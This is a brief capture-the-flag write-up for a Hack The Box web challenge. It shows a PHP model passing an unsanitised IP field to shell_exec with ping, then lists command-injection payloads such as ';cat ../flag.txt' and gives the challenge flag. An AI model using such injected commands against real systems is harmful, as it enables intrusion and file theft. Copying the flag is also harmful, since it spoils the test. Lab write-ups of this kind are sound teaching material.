# gunhead

**SOLVED**

> During Pandora's training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. 
> With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down.

`./build-docker.sh` -> http://127.0.0.1:1337

dockerfile -> mariadb, php

fpm? FastCGI Process Manager (FPM) https://www.php.net/manual/en/install.fpm.php

`challenge/models/ReconModel.php` 

```php
return shell_exec('ping -c 3 '.$this->ip);

# payloads:

# /ping ;pwd
# /ping ;ls ../
# /ping ;cat ../flag.txt
```

`HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}`